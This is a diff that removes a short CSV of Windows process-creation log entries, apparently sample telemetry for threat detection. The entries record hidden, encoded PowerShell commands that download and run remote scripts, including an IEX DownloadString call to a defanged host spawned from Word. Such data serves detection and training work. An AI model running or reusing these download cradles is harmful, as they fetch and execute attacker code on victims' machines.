@@ -1,4 +1,0 @@
-TimeCreated,Computer,User,Image,ParentImage,CommandLine
-2025-08-16T02:11:43+05:30,WS-042,acme\svc_backup,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA...
-2025-08-16T02:14:09+05:30,WS-105,acme\jane.doe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,powershell -ExecutionPolicy Bypass -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACkAKQA=
-2025-08-16T02:16:55+05:30,SRV-JMP-01,acme\svc_backup,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System\services.exe,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://updates-soft[.]com/p.ps1')"""
